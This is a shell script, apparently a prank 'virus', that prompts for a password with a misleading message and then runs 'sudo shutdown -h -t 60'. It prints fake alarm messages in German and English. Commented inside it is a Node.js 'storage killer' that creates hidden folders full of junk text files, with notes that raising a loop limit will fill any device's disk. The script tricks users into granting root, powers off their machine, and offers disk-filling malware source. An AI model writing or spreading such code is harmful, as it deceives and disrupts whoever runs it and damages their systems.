echo "Please provide the password for the program to fully execute,"
echo "CTRL+C will result in a malfunction"
sudo shutdown -h -t 60
# vi SKV.js
# i
# // THIS IS AN SPSR CLASSIFIED STORAGE KILLER, IT CAN KILL ANY DEVICES STORAGE BY CHANGING THE 'LET MAXVAL' TO A HIGHER NUMBER
# // variables
# // to run this file type node SKV.js
# const { clear } = require("console");
# const fs = require("fs");
# const path = require("path");
# let minval = 0;
# let maxval = 10;
# let timebasedfunc = Date.now();
# let minnumberoffiles = 0;
# let maxnumberoffiles = 10;
# let status = "red";
# // end of variables
# // overall main func
# fs.mkdir(path.join(__dirname, "/.SKV" + timebasedfunc), {}, function (err) {
#   if (err) {
#     throw err;
#   } else {
#     // internal folder
#     // for loop
#     for (let i = minval; i <= maxval; i++) {
#       // start of create folder-------------------------------------------------

#       // create folder
#       fs.mkdir(
#         path.join(__dirname, "/.SKV" + timebasedfunc + "/.SKV-D-" + i),
#         {},
#         function (err) {
#           if (err) {
#             throw err;
#           } else {
#             console.log("folder created");
#             for (let d = minnumberoffiles; d < maxnumberoffiles; d++) {
#               // create and write to a folder******************
#               fs.writeFile(
#                 path.join(
#                   __dirname,
#                   "/.SKV" + timebasedfunc + "/.SKV-D-" + i,
#                   "SKV-F=" + i + d + ".txt"
#                 ),
#                 "SKV VIRUS," +
#                   i +
#                   d +
#                   "=========STORAGE KILLER IN ACTION,Achtung, deise program wilt fullen deise computer, this program will corrupt your hd and fill it with hidden files, warning, not to be used with out permision from the spsr korps, not to be used without specialised personel, node 2022",
#                 function (err) {
#                   if (err) throw err;
#                   console.log("es gab keinen Fehler im SKV= " + i + "-" + d);
#                   status = "green";
#                   clearlogscall();
#                 }
#               );
#               //end of create folder -------------------------------------------------
#             }
#           }
#         }
#       );
#       // end of main script
#     }
#     // end of for loop
#   }
# });
# // end of father func
# console.log(
#   "----------------------------------------------------------------------------"
# );

# function clearlogs() {
#   console.clear();
# }
# // if (status === "green") {
# function clearlogscall(params) {
#   setTimeout(clearlogs, 8000);
#   console.log("clearing logs in 8 seconds, standby.......");
# }
# // clear console**********************
# // }

# node SKV.js
# ESC
# :wq
echo "SKV.JS INACTED"
cd ..
echo "!ACHTUNG! DAS PROGRAMM WURDE AKTIVIERT UND GEPFLANZT !ACHTUNG!"
echo "system executing, please standby, the operations have been completed,"
echo "Goodbye Comrade."